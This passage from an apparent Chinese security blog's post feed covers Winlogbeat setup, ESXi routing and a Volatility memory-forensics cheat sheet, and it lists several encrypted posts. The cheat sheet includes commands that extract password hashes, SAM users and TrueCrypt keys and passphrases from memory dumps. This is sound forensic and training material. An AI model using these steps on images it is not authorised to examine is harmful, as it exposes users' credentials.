Files\Winlogbeat\winlogbeat.yml</code> 以设置连接信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">output.elasticsearch:</span><br><span class="line">  hosts: [&quot;&lt;es_url&gt;&quot;]</span><br><span class="line">  username: &quot;elastic&quot;</span><br><span class="line">  password: &quot;&lt;password&gt;&quot;</span><br><span class="line">setup.kibana:</span><br><span class="line">  host: &quot;&lt;kibana_url&gt;&quot;</span><br></pre></td></tr></table></figure><p>其中，<code>&lt;password&gt;</code> 是 <code>elastic</code> 用户的密码，<code>&lt;es_url&gt;</code> 是 Elasticsearch 的 URL，<code>&lt;kibana_url&gt;</code> 是 Kibana 的 URL。</p><h3 id="启动Winlogbeat"><a href="#启动Winlogbeat" class="headerlink" title="启动Winlogbeat"></a>启动Winlogbeat</h3><p><code>setup</code> 命令加载 Kibana 仪表板。如果仪表板已设置，请省略此命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\winlogbeat.exe setup</span><br><span class="line"><span class="built_in">Start-Service</span> winlogbeat</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESXI实现三层路由</title>
      <link href="/p/25b09543.html"/>
      <url>/p/25b09543.html</url>
      
        <content type="html"><![CDATA[<h2 id="实现拓扑"><a href="#实现拓扑" class="headerlink" title="实现拓扑"></a>实现拓扑</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005132129301.png" alt="image-20211005132129301"></p><h2 id="ESXI配置"><a href="#ESXI配置" class="headerlink" title="ESXI配置"></a>ESXI配置</h2><p>管理口网卡，默认配置无需更改。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005133347623.png" alt="image-20211005133347623"></p><h3 id="sw0"><a href="#sw0" class="headerlink" title="sw0"></a>sw0</h3><p>默认的虚拟交换机，接上行链路连物理网卡。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005133521346.png" alt="image-20211005133521346"></p><h3 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h3><p>添加虚拟交换机<strong>vSwitch1</strong>，无需接上行链路，添加4个端口组（安全区、业务区、终端区、外部）</p><mark class="hl-label orange">注意</mark> 虚拟交换机需要配置vSwitch1，VLAN ID 4095<h2 id="旁路由配置"><a href="#旁路由配置" class="headerlink" title="旁路由配置"></a>旁路由配置</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005135541194.png" alt="image-20211005135541194"></p><p>配置双网卡</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005204516820.png" alt="image-20211005204516820"></p><p>磁盘挂载现有磁盘，导入软路由镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://netflixcn.com/miji/46.html</span><br><span class="line">https://u.nu/qy6z</span><br><span class="line">https://fw.koolcenter.com/LEDE_X64_fw867/</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005163701951.png" alt="image-20211005163701951"></p><blockquote><p>设置虚拟设备节点</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211005165323089.png" alt="image-20211005165323089"></p><mark class="hl-label orange">注意</mark>  只是暂时这么配置<h3 id="配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）"><a href="#配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）" class="headerlink" title="配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）"></a>配置管理LAN口和WAN口（两个都是挂载eth1上，接外部网络）</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006125656368.png" alt="image-20211006125656368"></p><blockquote><p>LAN-eth1需要最后配置</p></blockquote><h3 id="安全区、业务区、终端区接口配置"><a href="#安全区、业务区、终端区接口配置" class="headerlink" title="安全区、业务区、终端区接口配置"></a>安全区、业务区、终端区接口配置</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130033396.png" alt="image-20211006130033396"></p><p>安全区LAN1<code>10.1.1.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006125942068.png" alt="image-20211006125942068"></p><p>业务区LAN2<code>10.1.2.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130051651.png" alt="image-20211006130051651"></p><p>终端区LAN3<code>10.1.3.X</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130110370.png" alt="image-20211006130110370"></p><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130213278.png" alt="image-20211006130213278"></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130332009.png" alt="image-20211006130332009"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130351908.png" alt="image-20211006130351908"></p><h3 id="nat"><a href="#nat" class="headerlink" title="nat"></a>nat</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130425331.png" alt="image-20211006130425331"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130529972.png" alt="image-20211006130529972"></p><h2 id="上机测试"><a href="#上机测试" class="headerlink" title="上机测试"></a>上机测试</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211006130725812.png" alt="image-20211006130725812"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volatility</title>
      <link href="/p/616fb6ec.html"/>
      <url>/p/616fb6ec.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://github.com/volatilityfoundation/volatility/releases">https://github.com/volatilityfoundation/volatility/releases</a></p><p><a href="https://voltraining.wixsite.com/volatilityfoundation/releases">https://voltraining.wixsite.com/volatilityfoundation/releases</a></p><p>volatility_2.6_win64_standalone.zip</p><p>volatility_2.6_lin64_standalone.zip</p><p>安装方式有很多</p><h3 id="kali2021"><a href="#kali2021" class="headerlink" title="kali2021"></a>kali2021</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/volatilityfoundation/volatility</span><br><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br><span class="line">chmod +x vol.py</span><br><span class="line"></span><br><span class="line">大坑重灾区</span><br><span class="line">pip install yara-python #https://github.com/VirusTotal/yara-python</span><br><span class="line">pip install distorm3 #这个不好装</span><br><span class="line">pip install pycrypto #这个也不好装</span><br><span class="line">pip install openpyxl </span><br><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621242358914-298752d4-d8f8-4639-afb5-76fabd8de1bc.png" alt="img"></p><blockquote><p>pip install –upgrade setuptools</p></blockquote><p>中间还有很多坑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y python2.7-dev</span><br></pre></td></tr></table></figure><p>确定是<code>yara</code>的问题了</p><p>参考链接<a href="https://yara.readthedocs.io/en/v4.1.0/gettingstarted.html">https://yara.readthedocs.io/en/v4.1.0/gettingstarted.html</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621245031735-bda26bdd-60b6-4990-92c7-d6b34c97270a.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/lib/python2.7/dist-packages/usr/lib/libyara.so /usr/lib/libyara.so</span><br></pre></td></tr></table></figure><p>不报错了</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621245184755-4a1da13c-3e9e-4cff-8364-fa7a15e6557e.png" alt="img"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>需要识别到版本号，版本号较多。</p><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f &lt;文件名&gt; --profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br><span class="line">python vol.py -f &lt;文件名&gt; --profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br></pre></td></tr></table></figure><h3 id="判断未知内存镜像系统版本信息-imageinfo-kdbgscan"><a href="#判断未知内存镜像系统版本信息-imageinfo-kdbgscan" class="headerlink" title="判断未知内存镜像系统版本信息-imageinfo/kdbgscan"></a>判断未知内存镜像系统版本信息-imageinfo/kdbgscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img imageinfo</span><br></pre></td></tr></table></figure><blockquote><p>imageinfo  用于标识操作系统、service pack和硬件体系结构（32位或64位）；可能有多个建议的配置文件，必须选择正确的配置文件</p></blockquote><h3 id="列出转储时运行的进程的详细信息-pslist-pstree-psscan"><a href="#列出转储时运行的进程的详细信息-pslist-pstree-psscan" class="headerlink" title="列出转储时运行的进程的详细信息-pslist/pstree/psscan"></a>列出转储时运行的进程的详细信息-pslist/pstree/psscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 pslist &gt;pslist.txt</span><br></pre></td></tr></table></figure><blockquote><p>当内容比较多时候,<code>&gt;pslist.txt</code>导出文本进一步分析查看</p><p>pslist无法显示隐藏/终止进程，解决这个问题可以使用psscan</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929142622740.png" alt="image-20210929142622740"></p><h3 id="查看隐藏进程-psxview"><a href="#查看隐藏进程-psxview" class="headerlink" title="查看隐藏进程-psxview"></a>查看隐藏进程-psxview</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 psxview</span><br></pre></td></tr></table></figure><h3 id="网络连接情况-netscan"><a href="#网络连接情况-netscan" class="headerlink" title="网络连接情况-netscan"></a>网络连接情况-netscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f xxx.mem --profile=Win2003SP1x86 netscan</span><br></pre></td></tr></table></figure><h3 id="cmd的历史命令-cmdscan"><a href="#cmd的历史命令-cmdscan" class="headerlink" title="cmd的历史命令-cmdscan"></a>cmd的历史命令-cmdscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 cmdscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621260906140-2bac6047-05c2-4cfa-8c0a-3f733106d1a7.png" alt="img"></p><h3 id="扫描当前打开的文件-filescan"><a href="#扫描当前打开的文件-filescan" class="headerlink" title="扫描当前打开的文件-filescan"></a>扫描当前打开的文件-filescan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 filescan | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621261465665-64b38d3d-5eba-4336-aa16-b8ba1e647f87.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file_patched_tjctf.dmp --profile=Win7SP1x86_23418 filescan  |  grep Downloads</span><br></pre></td></tr></table></figure><blockquote><p>找下载的文件夹了，一般windows下载的内容都放在 Download 文件夹中</p></blockquote><h3 id="内存中隐藏或注入代码-malfind"><a href="#内存中隐藏或注入代码-malfind" class="headerlink" title="内存中隐藏或注入代码-malfind"></a>内存中隐藏或注入代码-malfind</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 malfind</span><br></pre></td></tr></table></figure><h3 id="进程装载的动态链接库-dlllist"><a href="#进程装载的动态链接库-dlllist" class="headerlink" title="进程装载的动态链接库-dlllist"></a>进程装载的动态链接库-dlllist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 dlllist &gt;dlllist.txt</span><br></pre></td></tr></table></figure><blockquote><p>其显示列表主要包括加载的动态链接库文件的基地址、文件大小以及文件所在路径</p></blockquote><h3 id="缓存在内存的注册表-hivelist"><a href="#缓存在内存的注册表-hivelist" class="headerlink" title="缓存在内存的注册表-hivelist"></a>缓存在内存的注册表-hivelist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 hivelist</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621566147801-14dafab3-05ce-4f71-b15c-2dde927e9f01.png" alt="img"></p><h3 id="打印注册表数据-hivedump"><a href="#打印注册表数据-hivedump" class="headerlink" title="打印注册表数据-hivedump"></a>打印注册表数据-hivedump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 hivedump -o 0xe146c398</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621566422727-46e1ee24-2dc5-4076-a3ed-badee02b53e4.png" alt="img"></p><h3 id="内存中的系统密码-hashdump"><a href="#内存中的系统密码-hashdump" class="headerlink" title="内存中的系统密码-hashdump"></a>内存中的系统密码-hashdump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929192633385.png" alt="image-20210929192633385"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f name --profile=WinXPSP2x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）</span><br><span class="line">python vol.py -f name --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621579773461-e80c098a-7777-43b1-b3ed-d67becebe97a.png" alt="img"></p><h3 id="程序运行信息-userassist"><a href="#程序运行信息-userassist" class="headerlink" title="程序运行信息-userassist"></a>程序运行信息-userassist</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 userassist</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929192842966.png" alt="image-20210929192842966"></p><blockquote><p>包含正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息</p></blockquote><h3 id="查看SID-getsids"><a href="#查看SID-getsids" class="headerlink" title="查看SID-getsids"></a>查看SID-getsids</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 getsids</span><br></pre></td></tr></table></figure><h3 id="寻找可能注入到各种进程中的恶意软件-malfind"><a href="#寻找可能注入到各种进程中的恶意软件-malfind" class="headerlink" title="寻找可能注入到各种进程中的恶意软件-malfind"></a>寻找可能注入到各种进程中的恶意软件-malfind</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 malfind -p 3088 #-p指定进程</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929194837418.png" alt="image-20210929194837418"></p><h3 id="获取SAM表中用户-printkey"><a href="#获取SAM表中用户-printkey" class="headerlink" title="获取SAM表中用户-printkey"></a>获取SAM表中用户-printkey</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929195635140.png" alt="image-20210929195635140"></p><h3 id="最后登录系统的账户-printkey"><a href="#最后登录系统的账户-printkey" class="headerlink" title="最后登录系统的账户-printkey"></a>最后登录系统的账户-printkey</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f mem.vmem --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogin&quot; </span><br></pre></td></tr></table></figure><h3 id="时间轴线-timeliner"><a href="#时间轴线-timeliner" class="headerlink" title="时间轴线-timeliner"></a>时间轴线-timeliner</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f name --profile=WinXPSP2x86 timeliner</span><br></pre></td></tr></table></figure><blockquote><p>多个位置来收集系统的活动信息 </p></blockquote><h3 id="查看windows服务-svcscan"><a href="#查看windows服务-svcscan" class="headerlink" title="查看windows服务-svcscan"></a>查看windows服务-svcscan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f memory.img --profile=Win2003SP1x86 svcscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210929211905541.png" alt="image-20210929211905541"></p><h3 id="保存内存中的某个进程-mem"><a href="#保存内存中的某个进程-mem" class="headerlink" title="保存内存中的某个进程-mem"></a>保存内存中的某个进程-mem</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile=WinXPSP2x86 mem -p 1180 -D E:\111</span><br></pre></td></tr></table></figure><h3 id="提取内存中的注册表信息-dumpregistry"><a href="#提取内存中的注册表信息-dumpregistry" class="headerlink" title="提取内存中的注册表信息-dumpregistry"></a>提取内存中的注册表信息-dumpregistry</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility.exe -f .\memdump.mem --profile=Win7SP1x86_23418 dumpregistry  --dump-dir=D:\text\</span><br></pre></td></tr></table></figure><blockquote><p>dumpregistry –dump-dir 提取内存注册表的目录路径，test先创建，最好不要在C盘</p></blockquote><h3 id="解析MFT记录、导出MFT记录-mftparser"><a href="#解析MFT记录、导出MFT记录-mftparser" class="headerlink" title="解析MFT记录、导出MFT记录-mftparser"></a>解析MFT记录、导出MFT记录-mftparser</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 mftparser</span><br><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 mftparser --output-file=mftverbose.txt -D mftoutput</span><br></pre></td></tr></table></figure><h3 id="获取TrueCrypt秘钥信息-truecryptmaster"><a href="#获取TrueCrypt秘钥信息-truecryptmaster" class="headerlink" title="获取TrueCrypt秘钥信息-truecryptmaster"></a>获取TrueCrypt秘钥信息-truecryptmaster</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 truecryptmaster</span><br></pre></td></tr></table></figure><h3 id="获取TrueCrypt密码信息-truecryptpassphrase"><a href="#获取TrueCrypt密码信息-truecryptpassphrase" class="headerlink" title="获取TrueCrypt密码信息-truecryptpassphrase"></a>获取TrueCrypt密码信息-truecryptpassphrase</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Win7_SP1_x86.vmem --profile=Win7SP1x86 truecryptpassphrase</span><br></pre></td></tr></table></figure><h3 id="提取进程PID文件-procdump"><a href="#提取进程PID文件-procdump" class="headerlink" title="提取进程PID文件-procdump"></a>提取进程PID文件-procdump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 procdump -p 1848 -D ./</span><br></pre></td></tr></table></figure><h4 id="dump文件-dumpfiles"><a href="#dump文件-dumpfiles" class="headerlink" title="dump文件-dumpfiles"></a>dump文件-dumpfiles</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/Desktop/memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 --dump-dir=./</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621263396438-2e0d552d-9911-42ae-8667-a2bf7bb256b0.png" alt="img"></p><blockquote><p>先filescan</p></blockquote><h4 id="导出dmp文件-memdump"><a href="#导出dmp文件-memdump" class="headerlink" title="导出dmp文件-memdump"></a>导出dmp文件-memdump</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ~/wtl/mem.vmem --profile=WinXPSP2x86 psscan</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621580643912-3bf7b029-326c-44fe-9ecf-696646029882.png" alt="img"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1621580758835-f2e4a842-e56c-4650-808c-73bf6f1367cd.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK</title>
      <link href="/p/faa03718.html"/>
      <url>/p/faa03718.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="924785f05f259b91d89d98a919e6710bd99f7f6a6b67a6ba798b4d4d8e33b0fe"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 蓝队建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计学习</title>
      <link href="/p/102b9580.html"/>
      <url>/p/102b9580.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="629f94aa8b940eec286199fee89e094f674a86e0de6a80176993d6ccabb5c779"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mimikatz</title>
      <link href="/p/b76dfd1e.html"/>
      <url>/p/b76dfd1e.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ff491188a231db8a60770f0e699b3a87c0cfdd7ee80421a9d50b0f0f11512597"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995</title>
      <link href="/p/47eeacbc.html"/>
      <url>/p/47eeacbc.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0d525db7c683d3c62cc2941bca8cb58db1626d44d7288783edce766e4a13f16b">c157c9744e0298d00173c08a9dbffe0edb4a31b3d0922e212758a1a21fb011521d61f29a38b9253117d93d18ab436ded7943fb452fb5e3bad6bcd4d33c81075463a93ee09f54868ffe49d331413ebef7ab9bfc4edc4c653d0ab34fb6a8930e97279d4e8ff66b68e3709bde641f67a44cb71bd3d16546acb74396d795e6dd0c2a7f12bec0cf5f9592226dd716f0c355a186784500a01d8e703815f46a65d427267b9171c15c37b3bac12979f8ea8d4dcb1a383ecc3df570fd7925c34fadbd25345ec868ec16160883a77fb01f736fc943ba6d63f25595bfd77a9571051100c29f81b0f10d807f6c422de2cc374f4f69431162567949fc1533f5b0f2099f6281124f23507a9f14cab46a26dce2ac73daf51f8f2a5e98c65db4fdd38663a176a6c24db78dfb19f9c1fc8d7ada89dd5129283c2b5f8ad41bc7bd2f0cc75b58080424a71ce9980741144beee7415bbb15f4b3d005788048069bb3a0916ea72dafcdc8eecee123e81e05a44f454ad7f1a3a155fba4ec56b80e7105b983b48141ddf9d297445f7ca96f5000cd365b923a92e2e9ac88edb8fec73fc0d90e579497133092e40bcfff985293fe8a7be3f626693ad10cba9fc3eb227a2fca359b9206d6171052aab51324d18e2aee55813678c3d4b20007a77cfadcac84bbc4c15f8acb88bff73060d6ac380866d9fa491ce69639fe38b249051bfaeb660c16f6ac9fb911a268ade24c2153db4e9e2fe8cd22524eced8476b8520f6bbb547f3eff03c415c9ff5cf25e363c6c624fc309cd22303780e9c34afbfa1fba81c1cb88995766e708cb183891961afe742e19c4db050cb78226b7b8a6ab8b366013637863b82cf5a489957cddcc1ea9147d68e009152ef883c8ba843422af9f044ab11002b76edfee42753216bba3c2f0e70ff2e8e139704d9f79df8afe5656744b969a6b7c546734e213cc347b2e3604fccbd6f23282431098b5e0670202e486fc678fbd7465594f273d134574f960de4cc545e4bea77cf4ccb1721c3f322c0c8c39317a8fdb547d437de9c09685cc77e74b1fe09c6b0404ab2111e8af67a656db75a4c5b7d6feeec02c1f72a8c97d2fd167f2f91c7676846fb6189122cfe9f8b7707ec135b5a0b4b585740b8c0dc23061b65b0f3c2bdd6f2cac3b40355ad52424a4f1feb14f4c13202b575e488ce1697bb259cf24174630aaaa0d3a4485fb4ea6f0f69663f978e95